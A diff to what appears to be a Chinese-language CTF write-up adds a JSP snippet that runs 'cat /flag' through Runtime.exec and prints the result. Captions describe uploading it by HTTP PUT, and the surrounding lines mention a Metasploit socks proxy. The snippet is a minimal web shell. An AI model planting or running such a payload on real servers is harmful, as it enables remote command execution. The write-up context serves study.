@@ -529,6 +529,19 @@ $ msf5 auxiliary(server/socks4a) > run
 
 这里要吐槽一下postman，这么好用的工具竟然只支持http代理，不支持socks代理，还得用Privoxy转发http代理。。。
 
+```jsp
+<%
+String cmd = "cat /flag";
+Process Proc = Runtime.getRuntime().exec(cmd);
+java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(Proc.getInputStream()));
+
+String line;
+while ((line = reader.readLine()) != null) {
+out.println(line);
+}
+%>
+```
+
 ![put上传](image-20200309051850367.png)
 
 ![get验证上传成功](image-20200309052111575.png)
